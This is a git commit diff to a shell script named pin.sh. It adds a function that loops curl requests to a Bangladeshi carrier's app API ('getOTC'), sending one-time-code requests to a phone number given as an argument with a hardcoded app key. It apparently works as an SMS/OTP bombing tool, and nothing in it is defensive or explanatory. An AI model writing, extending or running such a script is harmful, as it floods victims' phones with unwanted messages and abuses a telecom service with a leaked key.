c1ab556f0d6b39fb4fe964f74d817d510c48e283
Shayer Mahmud Sowmik <45136656+BloodySowmik@users.noreply.github.com>
2021-03-27 18:12:52 +0600

    Update pin.sh

--- pin.sh
+++ pin.sh
@@ -10,6 +10,14 @@ curl -s "https://circle.happycell.mobi/mylife/appapi/appcall.php?op=getOTC&pin=1
 done
 }
 
+rbpin(){
+#i=1
+for i in $( eval echo {0..${len}} )
+do
+curl -s "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=19823&app_version=75&msisdn='${2}'" --header 'x-app-key: 000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg' -L
+#i=$(($i + 1))
+done
+}
 
 if [ ${1} == "bl" ]
 then 
